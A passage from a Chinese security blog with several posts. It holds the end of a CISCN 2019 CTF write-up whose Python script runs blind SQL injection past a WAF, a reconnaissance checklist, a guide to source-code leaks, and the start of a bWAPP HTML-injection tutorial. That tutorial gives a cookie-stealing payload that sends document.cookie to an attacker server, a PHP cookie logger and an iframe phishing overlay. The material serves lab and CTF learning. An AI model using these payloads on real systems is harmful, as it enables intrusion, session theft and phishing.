<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png" alt></p>
</li>
</ul>
<h1 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h1><ul>
<li><p>考点 : insert() 盲注</p>
</li>
<li><p>一个登录页面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png" alt></p>
</li>
<li><p>试一试万能密码 <code>admin&#39;#</code> ，登录成功，并给出提示</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png" alt></p>
</li>
<li><p>经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过</p>
</li>
<li><p>给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png" alt></p>
</li>
<li><p><code>insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;)</code> 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。<code>insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)</code>把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。</p>
</li>
<li><p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.27.137.145/ciscn/web4/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"</span></span><br><span class="line"></span><br><span class="line">temp_list = []</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">255</span>):</span><br><span class="line">	payload_1 = <span class="string">"')&gt;(insert((select(load_file('/flag'))),"</span>+str(i)+<span class="string">",255,'')))#"</span></span><br><span class="line">	flag = <span class="string">''</span>.join(flag_list)</span><br><span class="line">	temp_list.clear()</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(select('"</span>+flag+chr(j)+payload_1</span><br><span class="line">		print(payload)</span><br><span class="line">		data = &#123;<span class="string">'username'</span> : payload,&#125;</span><br><span class="line">		r = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			temp_list.append(chr(j))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		flag_list.append(temp_list.pop())</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(<span class="string">''</span>.join(flag_list))</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png" alt></p>
</li>
<li><p>过滤语句 : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i"</span>,$username))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i"</span>,$passwd))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/信息搜集/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/信息搜集/" itemprop="url">信息搜集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T21:23:30+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/" itemprop="url" rel="index">
                    <span itemprop="name">渗透</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/信息搜集/" itemprop="url" rel="index">
                    <span itemprop="name">信息搜集</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息搜集的流程"><a href="#信息搜集的流程" class="headerlink" title="信息搜集的流程"></a>信息搜集的流程</h1><ul>
<li>域名：whois, 子域名, 备案信息</li>
<li>服务器 : dns 信息, 端口信息, 真实 IP</li>
<li>web : 网站架构, 敏感目录及敏感信息, 源码泄露, 旁站查询, C 段查询, 指纹系统, 探测 waf</li>
<li>企业 : 天眼, 维基</li>
</ul>
<h1 id="whois-查询"><a href="#whois-查询" class="headerlink" title="whois 查询"></a>whois 查询</h1><ul>
<li>直接进行 whois 查询</li>
<li>到微步查询询历史whois，可以获取到历史的whois信息</li>
<li>反查whois，获取该注册者/电话/邮箱下的相关域名</li>
</ul>
<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><ul>
<li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
<li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
<li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></li>
</ul>
<h1 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h1><ul>
<li>ICP 查询</li>
<li>公安部备案查询</li>
</ul>
<p>urls.txt 传入需要查询的网站</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">targets = []</span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icp_info</span><span class="params">(host)</span>:</span></span><br><span class="line">url = <span class="string">"https://icp.chinaz.com/ajaxsync.aspx?at=beiansl&amp;callback=jQuery111305329118231795913_1554378576520&amp;host=%s&amp;type=host"</span>%host</span><br><span class="line">html = requests.get(url,timeout=(<span class="number">5</span>,<span class="number">10</span>)).text</span><br><span class="line">pattern = re.compile(<span class="string">'SiteName:"(.*?)",MainPage:"(.*?)"'</span>,re.S)</span><br><span class="line">info = re.findall(pattern,html)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">name = info[i][<span class="number">0</span>]</span><br><span class="line">target = info[i][<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"%s:%s"</span>%(name,target))</span><br><span class="line"><span class="keyword">if</span> target <span class="keyword">not</span> <span class="keyword">in</span> targets:</span><br><span class="line">targets.append(target)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"icp_info.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">"%s:%s"</span>%(name,target) + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"url.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> a:</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">b = b.strip()</span><br><span class="line">icp_info(host=b)</span><br><span class="line">a.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">thread = threading.Thread(target=start,)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="DNS-信息查询"><a href="#DNS-信息查询" class="headerlink" title="DNS 信息查询"></a>DNS 信息查询</h1><ul>
<li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li>
<li><a href="https://tool.lu/dns/" target="_blank" rel="noopener">https://tool.lu/dns/</a></li>
</ul>
<h1 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h1><ul>
<li>Nmap</li>
</ul>
<h1 id="获取真实-IP"><a href="#获取真实-IP" class="headerlink" title="获取真实 IP"></a>获取真实 IP</h1><h1 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><ul>
<li>云悉</li>
<li>Nmap</li>
</ul>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><ul>
<li>云悉</li>
</ul>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul>
<li>云悉</li>
</ul>
<h2 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h2><ul>
<li>云悉</li>
</ul>
<h1 id="敏感目录及敏感信息"><a href="#敏感目录及敏感信息" class="headerlink" title="敏感目录及敏感信息"></a>敏感目录及敏感信息</h1><ul>
<li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></li>
<li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></li>
<li>御剑</li>
</ul>
<h1 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h1><h1 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h1><ul>
<li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li>
</ul>
<h1 id="C-段查询"><a href="#C-段查询" class="headerlink" title="C 段查询"></a>C 段查询</h1><ul>
<li>Nmap</li>
<li>北极熊扫描器扫</li>
</ul>
<h1 id="指纹系统"><a href="#指纹系统" class="headerlink" title="指纹系统"></a>指纹系统</h1><ul>
<li>云悉</li>
</ul>
<h1 id="探测-waf"><a href="#探测-waf" class="headerlink" title="探测 waf"></a>探测 waf</h1><ul>
<li>Nmap</li>
</ul>
<h1 id="网站资产"><a href="#网站资产" class="headerlink" title="网站资产"></a>网站资产</h1><ul>
<li>天眼</li>
<li>维基</li>
<li>shodan/zoomeye/fofa</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/19/源码泄露/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/19/源码泄露/" itemprop="url">常见源码泄露</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-19T01:08:12+08:00">
                2019-06-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/源码泄露/" itemprop="url" rel="index">
                    <span itemprop="name">源码泄露</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="hg"><a href="#hg" class="headerlink" title=".hg"></a>.hg</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>hg init 的时候生成 .hg</p>
<p>例如，<a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p>
<p>rip-hg.pl -v -u <a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p>
<h1 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><p>当在一个目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。</p>
<p>例如，<a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>使用 GitHack</p>
<p>python GitHack.py <a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p>
<h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h1><h2 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h2><p>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。</p>
<p>因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　</p>
<p>在发布代码时未删除文件夹中隐藏的 .DS_store，被发现后，获取了敏感的文件名等信息。</p>
<p>例如，<a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p>
<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>使用 ds_store_exp</p>
<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p>
<h1 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h1><h2 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h2><p>网站备份时，未安全存储备份文件</p>
<p>常见格式：</p>
<ul>
<li>.rar</li>
<li>.zip</li>
<li>.7z</li>
<li>.tar.gz</li>
<li>.bak</li>
<li>.swp</li>
<li>.txt</li>
<li>.html</li>
<li><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></li>
<li>url.tar.gz</li>
</ul>
<p>比如，<a href="http://wm123.baidu.com/wm123.tar.gz" target="_blank" rel="noopener">http://wm123.baidu.com/wm123.tar.gz</a></p>
<h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><p>直接访问下载</p>
<h1 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h1><h2 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h2><p>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。</p>
<p>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留。</p>
<p>例如，<a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p>
<h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p>
<p>rip-svn.pl -v -u <a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p>
<h1 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h1><h2 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h2><p>WEB-INF 是 Java 的 WEB 应用的安全目录。该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中</li>
<li>/WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件</li>
<li>/WEB-INF/database.properties：数据库配置文件</li>
</ul>
<p>在一些特定的场合却会让攻击者能读取到其中的内容，从而造成源码泄露</p>
<h2 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h2><p>直接访问</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/14/漏洞总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/14/漏洞总结/" itemprop="url">常见漏洞总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-14T21:59:48+08:00">
                2019-06-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>基于 bWAPP，所列举的 payload 只是典型例子</p>
<h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function htmli($data)</span><br><span class="line">  &#123;</span><br><span class="line">      return $data;</span><br><span class="line">  &#125;</span><br><span class="line">  if(isset($_GET[&quot;firstname&quot;]) &amp;&amp; isset($_GET[&quot;lastname&quot;]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_GET[&quot;firstname&quot;];</span><br><span class="line">      $lastname = $_GET[&quot;lastname&quot;];    </span><br><span class="line">      if($firstname == &quot;&quot; or $lastname == &quot;&quot;)</span><br><span class="line">      &#123;</span><br><span class="line">          echo &quot;&lt;font color=\&quot;red\&quot;&gt;Please enter both fields...&lt;/font&gt;&quot;   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      else            </span><br><span class="line">      &#123; </span><br><span class="line">          echo &quot;Welcome &quot; . htmli($firstname) . &quot; &quot; . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以 GET 方式提交数据。将提交的数据通过 URL 中，但是并<strong>未对输入进行过滤</strong></p>
<p>如果输入 <code>?firstname=1&amp;lastname=&lt;script&gt;alert(1)&lt;/script&gt;</code> </p>
<p>后面的输出就变为 <code>Welcome 1 &lt;script&gt;alert(1)&lt;/script&gt;</code>，浏览器会自动解析 JS 语句，从而弹窗</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>常是诱使用户点击包含恶意代码的 URL，常用于<strong>窃取 cookies</strong> 或者进行<strong>钓鱼欺骗</strong>。</p>
<h3 id="窃取-Cookies"><a href="#窃取-Cookies" class="headerlink" title="窃取 Cookies"></a>窃取 Cookies</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=&lt;script&gt;var x=new Image();x.src="http://192.168.233.1/test.php?cookie="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，192.168.233.1 可以替换为攻击者的服务器，test.php 为接受 cookies 的文件，这样就可以获取点击者的 cookies</p>
<p>test.php ( 用于接收 cookie )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($log, $cookie);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png" alt></p>
<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=(</span><br><span class="line"><span class="string">'&lt;div style="position:absolute;top:0px;left:0px;width:100%;high:100%;"&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;iframe src=http://192.168.233.1/fish.html width=100% height=100%&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;/iframe&gt;&lt;/div&gt;'</span></span><br><span class="line">);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建一个 Iframe 框架覆盖原页面，强制输入，其中，192.168.233.1 可以替换为攻击者的服务器，fish.html 为钓鱼页面，fish.php 接收数据</p>
<p>fish.html ( 钓鱼页面，直接从真实页面复制 )</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"fish.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"Nick"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"Pass"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>fish.php ( 接收传递的数据 )</p>
